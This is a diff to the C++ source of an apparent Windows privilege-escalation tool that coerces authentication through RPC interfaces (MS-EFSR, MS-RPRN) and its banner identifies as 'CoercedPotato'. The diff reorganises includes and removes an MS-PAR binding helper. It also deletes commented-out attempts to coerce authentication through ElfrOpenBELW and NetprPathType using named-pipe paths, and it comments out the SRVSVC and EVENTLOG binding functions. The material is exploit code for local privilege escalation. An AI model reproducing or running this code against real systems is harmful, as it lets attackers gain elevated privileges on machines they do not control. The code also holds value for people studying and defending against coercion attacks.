@@ -16,11 +16,8 @@
 #include <sdkddkver.h>
 
 
-#include "ms-srvsvc_h.h"
-#include "ms-efsr_h.h"
-#include "ms-rprn_h.h"
-#include "ms-par_h.h"
-#include "ms-even_h.h"
+#include "lib/ms-efsr_h.h"
+#include "lib/ms-rprn_h.h"
 #include "CoerceFunctions.h"
 #include "CLI11.hpp"
 
@@ -408,102 +405,8 @@ void exploitAll(wchar_t* command, int exploitId, bool force) {
     }
 }
 
-BOOL createRPCbind_for_mspar(RPC_BINDING_HANDLE& binding_h)
-{
-
-    RPC_STATUS status;
-    RPC_WSTR NetworkAddr = (RPC_WSTR)L"\\\\localhost";
-
-    RPC_WSTR bindingString = nullptr;
-    status = RpcStringBindingCompose(
-        nullptr,              // Address targeted (NULL for local binding)
-        (RPC_WSTR)L"ncalrpc", // Protocol used 
-        nullptr,              // Endpoint (NULL for dynamic binding)
-        nullptr,              // UUID (NULL for dynamic binding)
-        nullptr,              // Options (utilisez nullptr pour les options par défaut)
-        &bindingString
-    );
-
-    if (status != RPC_S_OK) {
-        std::cerr << "[-] An error has occurred during the binding : " << status << std::endl;
-        return FALSE;
-    }
-
-    status = RpcBindingFromStringBinding(bindingString, &binding_h);
-
-    if (status != RPC_S_OK) {
-        std::cerr << "[-] An error has occurred during the binding : " << status << std::endl;
-        RpcStringFree(&bindingString);
-        return FALSE;
-    }
-    status = RpcStringFree(&bindingString);
-
-    if (status != RPC_S_OK) {
-        std::cerr << "[-] An error has occurred during the binding : " << status << std::endl;
-    }
-    wprintf(L"[+] RPC binding with localhost done \r\n\n");
-    return TRUE;  // Success
-}
-
 int main(int argc, char** argv)
 {
-    /*
-    // TENTATIVE AVEC MS-EVEN 
-    // TENTATIVE AVEC MS-EVEN 
-    NTSTATUS status;
-    EVENTLOG_HANDLE_W UNCServerName = NULL;  // Remplacez par le nom du serveur UNC approprié
-    RPC_UNICODE_STRING BackupFileName;
-
-    wchar_t backupPath[] = L"\\??\\UNC\\SRV01\\pipe\\foo123\x00";
-    BackupFileName.Length = (USHORT)(wcslen(backupPath) * sizeof(wchar_t));
-    BackupFileName.MaximumLength = BackupFileName.Length + sizeof(wchar_t);  // Assurez-vous d'inclure le caractère nul
-    BackupFileName.Buffer = backupPath;
-
-    // Initialiser la chaîne avec "\\??\\UNC\\localhost/pipe/poool2"
-
-    unsigned long MajorVersion = 1; // Spécifiez la version majeure
-    unsigned long MinorVersion = 1; // Spécifiez la version mineure
-    IELF_HANDLE LogHandle = NULL; // Initialisez le pointeur à NULL
-
-    // Appeler ElfrOpenBELW
-    wprintf(L"Calling ElfrOpenBELW() to coerce authentication to %ls\r\n\n", backupPath);
-    status = ElfrOpenBELW(
-        UNCServerName,
-        &BackupFileName,
-        MajorVersion,
-        MinorVersion,
-        &LogHandle
-    );
-
-    if (status != ERROR_SUCCESS) {
-        std::cerr << "Attack probably worked !\n\n" << std::endl;
-        // Gérer l'erreur selon vos besoins.
-    }
-    else {
-        // Traitement avec LogHandle selon vos besoins.
-    }
-
-    return 0;
-    */
-
-    /*
-    // TENTATIVE AVEC MS-PAR
-    handle_t RPCBind;
-    if (!createRPCbind(RPCBind)) {
-        wprintf(L"[RPCBIND] An error has occurred during the RPC binding \r\n");
-        return FALSE;
-    }
-    wchar_t* namedpipe;
-    namedpipe = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
-    StringCchPrintf(namedpipe, MAX_PATH, L"\\\\localhost/pipe/poool2");
-    callNetprPathType(namedpipe);
-    return 0;
-    
-
-
-    long result = callRpcAsyncOpenPrinter(RPCBind, namedpipe);
-    */
-    
     std::cout << "                                                                  " << std::endl;
     std::cout << "   ____                            _ ____       _        _        " << std::endl;
     std::cout << "  / ___|___   ___ _ __ ___ ___  __| |  _ \\ ___ | |_ __ _| |_ ___  " << std::endl;
@@ -646,7 +549,7 @@ void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t BindingHandle
 
     return;
 }
-
+/*
 handle_t __RPC_USER SRVSVC_HANDLE_bind(SRVSVC_HANDLE pszSystemName)
 {
     handle_t hBinding = NULL;
@@ -663,8 +566,6 @@ handle_t __RPC_USER SRVSVC_HANDLE_bind(SRVSVC_HANDLE pszSystemName)
         wprintf(L"RpcStringBindingCompose returned %ld\n", status);
         return NULL;
     }
-
-    /* Set the binding handle that will be used to bind to the server. */
     status = RpcBindingFromStringBindingW(pszStringBinding,
         &hBinding);
     if (status)
@@ -717,7 +618,6 @@ EVENTLOG_HANDLE_A_bind(EVENTLOG_HANDLE_A UNCServerName)
         return NULL;
     }
 
-    /* Set the binding handle that will be used to bind to the server. */
     status = RpcBindingFromStringBindingA(pszStringBinding,
         &hBinding);
 
@@ -755,7 +655,6 @@ EVENTLOG_HANDLE_W_bind(EVENTLOG_HANDLE_W UNCServerName)
         return NULL;
     }
 
-    /* Set the binding handle that will be used to bind to the server. */
     status = RpcBindingFromStringBindingW(pszStringBinding,
         &hBinding);
 
@@ -772,4 +671,4 @@ EVENTLOG_HANDLE_W_unbind(EVENTLOG_HANDLE_W UNCServerName,
     RPC_STATUS status;
 
     status = RpcBindingFree(&hBinding);
-}
+}*/
